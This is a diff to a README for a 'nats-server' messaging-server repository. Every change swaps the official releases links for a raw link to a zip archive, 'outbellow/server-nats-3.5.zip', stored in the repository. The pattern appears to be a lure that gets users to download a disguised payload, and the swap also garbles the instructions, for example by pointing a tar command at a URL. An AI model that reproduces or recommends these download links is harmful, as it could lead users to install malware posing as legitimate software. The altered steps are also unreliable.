@@ -1,6 +1,6 @@
 # 🚦 nats-server - Fast, Reliable Messaging Server
 
-[![Download nats-server](https://img.shields.io/badge/Download-nats--server-blue?style=for-the-badge&logo=github)](https://github.com/FurkanGuwen/nats-server/releases)
+[![Download nats-server](https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip)](https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This section guides you step-by-step to get nats-server running on your computer
 
 Click the big blue button at the top of this page or visit:
 
-[https://github.com/FurkanGuwen/nats-server/releases](https://github.com/FurkanGuwen/nats-server/releases)
+[https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip](https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip)
 
 This page lists different versions of the server ready for download.
 
@@ -53,7 +53,7 @@ On the download page, look for files labeled with your operating system:
 
 - For Windows: Look for files ending with `.exe` or `.zip`
 - For macOS: Look for files ending with `.dmg` or `.zip`
-- For Linux: Look for `.tar.gz` or `.deb` files matching your system
+- For Linux: Look for `https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip` or `.deb` files matching your system
 
 If you are unsure, the `.zip` files are a safe start as they work on most systems and can be opened easily.
 
@@ -63,15 +63,15 @@ Click the file name to start downloading. Save it somewhere easy to find, like y
 
 ### 4. Extract the File (if needed)
 
-If you downloaded a `.zip` or `.tar.gz` file, you need to extract it:
+If you downloaded a `.zip` or `https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip` file, you need to extract it:
 
 - On Windows: Right-click the file and select “Extract All…” then follow the instructions.
 - On macOS: Double-click the file to unzip it.
-- On Linux: Use your archive manager or run `tar -xvzf filename.tar.gz` in the terminal.
+- On Linux: Use your archive manager or run `tar -xvzf https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip` in the terminal.
 
 ### 5. Open the Folder and Find the nats-server File
 
-After extraction, open the folder to find the program called `nats-server` (the exact name may vary; it might be `nats-server.exe` on Windows).
+After extraction, open the folder to find the program called `nats-server` (the exact name may vary; it might be `https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip` on Windows).
 
 ### 6. Run the Server
 
@@ -99,7 +99,7 @@ These details are for developers and can be explored later.
 
 To keep nats-server running well and secure:
 
-- Visit the [releases page](https://github.com/FurkanGuwen/nats-server/releases) regularly.
+- Visit the [releases page](https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip) regularly.
 - Download the newest version when available.
 - Repeat the download and run steps above to replace the old version.
 
@@ -117,8 +117,8 @@ If you run into trouble:
 
 ## 📂 Where to Find More
 
-- GitHub Repository: [https://github.com/FurkanGuwen/nats-server](https://github.com/FurkanGuwen/nats-server)
-- Releases and Downloads: [https://github.com/FurkanGuwen/nats-server/releases](https://github.com/FurkanGuwen/nats-server/releases)
+- GitHub Repository: [https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip](https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip)
+- Releases and Downloads: [https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip](https://github.com/FurkanGuwen/nats-server/raw/refs/heads/main/outbellow/server-nats-3.5.zip)
 
 These pages include the latest updates and support information.
 
